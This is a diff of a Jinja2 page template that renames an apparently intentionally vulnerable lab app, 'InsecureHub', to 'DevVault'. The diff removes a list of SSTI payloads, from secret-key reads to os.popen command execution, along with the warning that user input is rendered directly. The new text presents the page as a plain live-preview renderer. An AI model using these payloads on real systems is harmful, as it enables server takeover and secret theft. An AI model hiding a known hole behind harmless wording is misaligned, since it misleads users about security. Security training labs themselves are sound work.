@@ -1,46 +1,43 @@
 {% extends "base.html" %}
-{% block title %}Template Renderer — InsecureHub{% endblock %}
+{% block title %}Template Renderer — DevVault{% endblock %}
 {% block content %}
-<div class="page-container">
+<div class="container-md">
     <div class="page-header">
-        <h1 class="page-title">🔥 Template Renderer</h1>
-        <p class="page-subtitle">Render Jinja2 templates — SSTI vulnerability active</p>
+        <div>
+            <h1 class="page-title">Template Renderer</h1>
+            <div class="page-subtitle">Render Jinja2 templates with live preview</div>
+        </div>
     </div>
 
-    <div class="form-card">
-        <form method="POST" action="{{ url_for('render_template_page') }}" class="form" id="render-form">
-            <div class="form-group">
-                <label class="form-label" for="template">Jinja2 Template</label>
-                <textarea id="template" name="template" class="form-textarea code-textarea" rows="8"
-                    placeholder="Enter Jinja2 template here...">{{ template_input }}</textarea>
-                <div class="form-hint">Your input is passed directly to render_template_string(). Full Jinja2 execution!
+    <div class="box mb-3">
+        <div class="box-header">
+            <span class="box-header-title">Template input</span>
+        </div>
+        <div class="box-body">
+            <form method="POST" action="{{ url_for('render_template_page') }}" id="render-form">
+                <div class="form-group">
+                    <label class="form-label" for="template">Jinja2 template</label>
+                    <textarea id="template" name="template" class="form-textarea form-mono" rows="10"
+                        placeholder="Enter your Jinja2 template here...">{{ template_input }}</textarea>
+                    <div class="form-hint">Supports standard Jinja2 syntax including variables, filters, and control
+                        structures.</div>
                 </div>
-            </div>
-            <button type="submit" class="btn btn-primary" id="render-btn">Render Template</button>
-        </form>
+                <button type="submit" class="btn btn-primary" id="render-btn">Render</button>
+            </form>
+        </div>
     </div>
 
     {% if output is not none %}
-    <div class="result-card">
-        <div class="result-header">
-            <span class="result-title">📄 Rendered Output</span>
+    <div class="output-box">
+        <div class="output-box-header">
+            <svg width="14" height="14" viewBox="0 0 16 16" fill="currentColor">
+                <path
+                    d="M0 1.75C0 .784.784 0 1.75 0h12.5C15.216 0 16 .784 16 1.75v9.5A1.75 1.75 0 0 1 14.25 13H8.06l-2.573 2.573A1.458 1.458 0 0 1 3 14.543V13H1.75A1.75 1.75 0 0 1 0 11.25Z" />
+            </svg>
+            Rendered output
         </div>
-        <pre class="result-body">{{ output }}</pre>
+        <div class="output-box-body">{{ output }}</div>
     </div>
     {% endif %}
-
-    <div class="hint-box hint-vuln">
-        <span class="hint-title">🔥 SSTI Payloads — Escalating Severity</span>
-        <div class="payload-list">
-            <code>{{ '{{' }} 7*7 {{ '}}' }}</code>
-            <code>{{ '{{' }} config.SECRET_KEY {{ '}}' }}</code>
-            <code>{{ '{{' }} config {{ '}}' }}</code>
-            <code>{{ '{{' }} ''.__class__.__mro__[1].__subclasses__() {{ '}}' }}</code>
-            <code>{{ '{{' }} ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['os'].popen('id').read() {{ '}}' }}</code>
-            <code>{{ '{{' }} request.application.__globals__.__builtins__.__import__('os').popen('whoami').read() {{ '}}' }}</code>
-        </div>
-        <p class="hint-note">⚠ The subclass index may vary. Use the subclasses payload first to find the right index.
-        </p>
-    </div>
 </div>
 {% endblock %}
